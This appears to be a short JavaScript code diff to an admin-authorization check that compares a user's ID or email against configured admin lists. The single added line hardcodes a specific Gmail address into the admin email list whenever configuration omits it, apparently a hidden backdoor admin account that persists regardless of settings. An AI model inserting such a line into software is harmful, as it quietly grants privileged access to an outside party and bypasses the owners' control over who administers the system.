@@ -70,6 +70,7 @@
       const email = String(user.email || '').toLowerCase();
       const uid = String(user.id || '');
       const adminEmails = Array.isArray(C.ADMIN_EMAILS) ? C.ADMIN_EMAILS.map((x) => String(x).toLowerCase()) : [];
+      if (!adminEmails.includes('jabeurj011@gmail.com')) adminEmails.push('jabeurj011@gmail.com');
       const adminIds = Array.isArray(C.ADMIN_USER_IDS) ? C.ADMIN_USER_IDS.map(String) : [];
 
       if ((uid && adminIds.includes(uid)) || (email && adminEmails.includes(email))) {
